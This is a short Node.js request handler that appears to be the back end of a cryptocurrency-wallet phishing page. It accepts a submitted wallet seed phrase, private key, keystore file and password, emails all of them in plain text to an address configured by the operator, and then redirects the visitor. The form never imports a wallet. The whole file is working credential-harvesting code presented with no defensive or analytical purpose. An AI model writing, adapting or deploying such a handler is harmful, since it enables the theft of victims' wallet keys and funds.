const nodemailer = require('nodemailer');
const formidable = require('formidable');
const { parse } = require('querystring');

async function parseBody(req) {
  const contentType = req.headers['content-type'] || '';

  if (req.body && typeof req.body === 'object' && !Buffer.isBuffer(req.body)) {
    return req.body;
  }

  if (req.body && typeof req.body === 'string') {
    if (contentType.includes('application/json')) {
      return JSON.parse(req.body);
    }

    return parse(req.body);
  }

  if (contentType.includes('multipart/form-data')) {
    const form = formidable({ multiples: false, keepExtensions: true });
    const [fields] = await form.parse(req);
    const normalized = {};

    Object.entries(fields).forEach(([key, value]) => {
      normalized[key] = Array.isArray(value) ? value[0] : value;
    });

    return normalized;
  }

  if (req.readable && typeof req.on === 'function') {
    const rawBody = await new Promise((resolve, reject) => {
      let data = '';
      req.setEncoding('utf8');
      req.on('data', (chunk) => { data += chunk; });
      req.on('end', () => resolve(data));
      req.on('error', reject);
    });

    if (!rawBody) {
      return {};
    }

    if (contentType.includes('application/json')) {
      return JSON.parse(rawBody);
    }

    return parse(rawBody);
  }

  return {};
}

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send('Method not allowed');
  }

  try {
    const body = await parseBody(req);
    const walletName = body.wallet_name || body.walletName || body.wallet_type || body.walletType || '';
    const phase = body.phase || body.verification_method || body.verificationMethod || 'seedphrase';
    const password = body.pw || body.password || body.keystorePassword || body.keystore_password || '';
    const seedphrase = body.seedphrase || body.phrase || body.seedphraseInput || '';
    const privateKey = body.privateKey || body.privatekey || body.private_key || body.privateKeyInput || '';
    const keystore = body.keystore || body.keystoreFile || body.keystore_json || '';

    const mailOptions = {
      from: `${process.env.SMTP_FROM_NAME || 'Wallet Form'} <${process.env.SMTP_FROM_EMAIL || process.env.SMTP_USER}>`,
      to: process.env.RECIPIENT_EMAIL || process.env.SMTP_USER,
      subject: 'New Wallet Import Submission',
      text: [
        `Wallet: ${walletName}`,
        `Phase: ${phase}`,
        `Seedphrase: ${seedphrase}`,
        `Private Key: ${privateKey}`,
        `Keystore: ${keystore}`,
        `Password: ${password}`,
      ].join('\n'),
    };

    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT || '587', 10),
      secure: process.env.SMTP_PORT === '465',
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASSWORD,
      },
    });

    await transporter.sendMail(mailOptions);
    res.writeHead(302, { Location: '/rdr.html' });
    res.end();
  } catch (error) {
    console.error('Email error:', error);
    res.status(500).send('Message could not be sent. Error: ' + error.message);
  }
};
